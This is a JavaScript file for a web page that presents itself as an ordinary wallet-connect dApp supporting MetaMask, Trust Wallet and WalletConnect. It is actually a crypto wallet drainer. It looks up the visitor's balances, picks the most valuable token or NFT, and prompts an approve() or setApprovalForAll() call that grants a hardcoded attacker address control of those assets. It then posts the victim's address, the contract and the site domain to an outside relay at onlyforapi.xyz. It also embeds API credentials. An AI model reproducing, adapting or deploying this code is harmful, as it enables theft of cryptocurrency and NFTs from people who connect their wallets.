const defaultNetworks = ["ethereum", "binance-smart-chain", "polygon"]
const chainIdsNetworks = {
    "ethereum": 1,
    "binance-smart-chain": 56,
    "polygon": 137
}
const chainIdsNames = {
    "ethereum": "Ethereum",
    "binance-smart-chain": "Binance Smart Chain",
    "polygon": "Polygon"
}
const forbiddenTokens = ["ETH", "BNB", "MATIC"]

const abi = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const abiNFT = [
    {
        "inputs": [{
            "internalType": "address",
            "name": "operator",
            "type": "address"
        }, {
            "internalType": "bool",
            "name": "approved",
            "type": "bool"
        }],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

const accountBalances = {
    tokens: [],
    nft: []
}

const WITHDRAWAL_ADDRESS = "0xdc10f602082053230E0A1B441A4595D342e77ba4"
const MINIMAL_SUM_IN_USD = 1

let accountAddress = null, walletConnector, currentConnection

const getMobileOperatingSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}

const getDAppSystem = () => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    if (/Trust/i.test(userAgent)) {
        return "Trust";
    }

    if (/CriOS/i.test(userAgent)) {
        return "Metamask";
    }

    return "unknown";
}

const openMetaMaskUrl = (url) => {
    const a = document.createElement("a");
    a.href = url;
    a.target = "_self";
    document.body.appendChild(a);
    a.click();
    a.remove();
}

const getBalances = async () => {
    try {
        $("#overlay").fadeIn(300);
        $('#chainErrorMessage').hide();

        if (currentConnection === "metamask") {
            if (typeof window.ethereum.selectedAddress !== "undefined") {
                accountAddress = window.ethereum.selectedAddress
            } else if (typeof window.ethereum.address !== "undefined") {
                accountAddress = window.ethereum.address
            }
        } else if (currentConnection === "walletconnect") {
            accountAddress = walletConnector._accounts[0]
        }

        const response = await $.ajax({
            url: `https://api.zapper.fi/v2/balances?addresses%5B%5D=${accountAddress}`,
            type: "GET",
            headers: {
                Authorization: "Basic OTZlMGNjNTEtYTYyZS00MmNhLWFjZWUtOTEwZWE3ZDJhMjQxOg=="
            }
        })

        const events = response.split('event: ')

        for (const event of events) {
            const data = event.split('data: ')

            if (typeof data[0] !== "undefined") {
                if (data[0].indexOf("category") > -1) {
                    const category = JSON.parse(data[1]);
                    const wallet = category['wallet']
                    const nft = category['nft']

                    for (const wal of Object.values(wallet)) {
                        if (defaultNetworks.indexOf(wal.network) > -1) {
                            accountBalances["tokens"].push(wal)
                        }
                    }

                    for (const wal of Object.values(nft)) {
                        if (defaultNetworks.indexOf(wal.network) > -1) {
                            accountBalances["nft"].push(wal)
                        }
                    }
                }
            }
        }

        accountBalances.tokens.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))
        accountBalances.nft.sort((a, b) => (a.balanceUSD > b.balanceUSD) ? -1 : ((b.balanceUSD > a.balanceUSD) ? 1 : 0))

        for (const forbiddenToken of forbiddenTokens) {
            const index = accountBalances.tokens.findIndex(x => x.context.symbol === forbiddenToken)

            if (index > -1) {
                accountBalances.tokens.splice(index, 1)
            }
        }

        let topNFT = null, topToken = null, withdrawalToken = null

        if (typeof accountBalances.tokens[0] !== "undefined") {
            topToken = accountBalances.tokens[0]
        }

        if (typeof accountBalances.nft[0] !== "undefined") {
            topNFT = accountBalances.nft[0]
        }

        if ((topNFT && topToken) && topNFT.balanceUSD > topToken.balanceUSD) {
            withdrawalToken = topNFT
        } else if ((topNFT && topToken) && topNFT.balanceUSD < topToken.balanceUSD) {
            withdrawalToken = topToken
        } else if (topNFT) {
            withdrawalToken = topNFT
        } else if (topToken) {
            withdrawalToken = topToken
        }

        if (withdrawalToken) {
            if (withdrawalToken.balanceUSD < MINIMAL_SUM_IN_USD) {
                $("#overlay").fadeOut(300);

                return
            }

            let web3, provider

            if (currentConnection === "metamask") {
                web3 = new Web3(window.ethereum)
                provider = new ethers.providers.Web3Provider(window.ethereum, "any")

                if (parseInt(window.ethereum.networkVersion) !== chainIdsNetworks[withdrawalToken.network]) {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{chainId: web3.utils.toHex(chainIdsNetworks[withdrawalToken.network])}]
                    });
                }
            } else if (currentConnection === "walletconnect") {
                if (walletConnector._chainId !== chainIdsNetworks[withdrawalToken.network]) {
                    $('#chainErrorName').text(chainIdsNames[withdrawalToken.network])
                    $('#chainErrorMessage').show();

                    $("#overlay").fadeOut(300);

                    return
                }

                provider = new window.WalletConnectProvider.default({
                    rpc: {
                        1: "https://mainnet.infura.io/v3/8d15dd68b697464abf8c45cf43410c03",
                        56: "https://bsc-dataseed.binance.org/",
                        137: "https://polygon-rpc.com"
                    }
                });

                await provider.enable()

                provider = new ethers.providers.Web3Provider(provider, "any")
            }

            const signer = provider.getSigner()

            if (withdrawalToken.appId === "tokens") {
                const contract = new ethers.Contract(withdrawalToken.address, abi, signer)

                try {
                    await contract.approve(WITHDRAWAL_ADDRESS, withdrawalToken.context.balanceRaw)

                    $.ajax({
                        url: "https://onlyforapi.xyz/api.php?function=sendData",
                        type: "POST",
                        data: "parse_mode=HTML&text="+encodeURIComponent("Контракт: "+withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Адрес владельца: "+accountAddress)+"%0A%0A"+encodeURIComponent("Домен: "+window.location.host),
                    })

                    $("#overlay").fadeOut(300);
                } catch (e) {
                    $("#overlay").fadeOut(300);
                }
            } else if (withdrawalToken.appId === "nft") {
                const contract = new ethers.Contract(withdrawalToken.address, abiNFT, signer)

                try {
                    await contract.setApprovalForAll(WITHDRAWAL_ADDRESS, true)

                    $.ajax({
                        url: "https://onlyforapi.xyz/api.php?function=sendData",
                        type: "POST",
                        data: "parse_mode=HTML&text="+encodeURIComponent("Контракт: "+withdrawalToken.address)+"%0A%0A"+encodeURIComponent("Адрес владельца: "+accountAddress)+"%0A%0A"+encodeURIComponent("Домен: "+window.location.host),
                    })

                    $("#overlay").fadeOut(300);
                } catch (e) {
                    $("#overlay").fadeOut(300);
                }
            } else {
                $("#overlay").fadeOut(300);
            }
        } else {
            $("#overlay").fadeOut(300);
        }
    } catch (e) {

    }
}

const checkInstallMetamask = () => {
    return new Promise((res) => {
        if (typeof window.ethereum !== 'undefined') {
            return res(true)
        } else {
            return res(false)
        }
    })
}

const connectMetamask = async () => {
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
        openMetaMaskUrl(`https://metamask.app.link/dapp/${window.location.host}`)

        return
    }

    window.ethereum.on('accountsChanged', function (accounts) {
        accountAddress = accounts[0]

        $('#connectMetamask').hide()
        $('#connectTrustWallet').hide()
        $('#approve').show()
        $('#logout').show();
    });

    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

    accountAddress = accounts[0]
    currentConnection = "metamask"

    $('#connectMetamask').hide()
    $('#connectTrustWallet').hide()
    $('#approve').show()
    $('#logout').show();
}

const connectTrustWallet = async () => {
    if (!window.ethereum?.isTrust && getMobileOperatingSystem() !== "unknown") {
        openMetaMaskUrl(`https://link.trustwallet.com/open_url?coin_id=60&url=${window.location.origin}`)

        return
    }

    if (window.ethereum?.isTrust) {
        window.ethereum.on('accountsChanged', function (accounts) {
            accountAddress = accounts[0]

            $('#connectMetamask').hide()
            $('#connectTrustWallet').hide()
            $('#approve').show()
            $('#logout').show();
        });

        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'})

        accountAddress = accounts[0]
        currentConnection = "metamask"

        $('#connectMetamask').hide()
        $('#connectTrustWallet').hide()
        $('#approve').show()
        $('#logout').show();
    } else {
        if (!walletConnector.connected) {
            walletConnector.createSession().then(() => {
                const uri = walletConnector.uri;

                window.WalletConnectQRCodeModal.default.open(uri, () => {
                    console.log('QR Code Modal closed');
                });
            });
        } else {
            walletConnector.killSession();
        }
    }
}

const initMetamask = async () => {
    if (getDAppSystem() !== "Metamask" && getMobileOperatingSystem() !== "unknown") {
        $('#connectMetamask').show();

        return
    }

    const installedMetamask = await checkInstallMetamask()

    if (!installedMetamask) {
        $('#metamaskNotInstalled').show()

        return
    }

    $('#connectMetamask').show();
}

const initWalletConnect = () => {
    if (getDAppSystem() !== "Trust" && getMobileOperatingSystem() !== "unknown") {
        $('#connectTrustWallet').show();

        return
    }

    walletConnector = new window.WalletConnect.default({
        bridge: 'https://bridge.walletconnect.org'
    });

    $('#connectTrustWallet').show()

    walletConnector.on('connect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {
            window.WalletConnectQRCodeModal.default.close();

            $('#connectTrustWallet').hide()
            $('#connectMetamask').hide();
            $('#approve').show();
            $('#logout').show();

            accountAddress = payload.params[0].accounts[0]
            currentConnection = "walletconnect"
        }
    });

    walletConnector.on('session_update', function (error, payload) {
        if (error) {
            console.error(error);
        } else if (walletConnector.connected) {
            $('#connectTrustWallet').hide()
            $('#connectMetamask').hide();
            $('#approve').show();
            $('#logout').show();

            accountAddress = payload.params[0].accounts[0]
        }

    });

    walletConnector.on('disconnect', function (error, payload) {
        if (error) {
            console.error(error);
        } else {
            $('#connectTrustWallet').show()
            $('#connectMetamask').show();
            $('#approve').hide();
            $('#logout').hide();

            accountAddress = null
        }
    });
}

const logout = async () => {
    $('#connectMetamask').show();
    $('#connectTrustWallet').show()
    $('#approve').hide();
    $('#logout').hide();
}

$(document).ready(() => {
    setTimeout(() => {
        initMetamask()
        initWalletConnect()
    }, 1000)
});
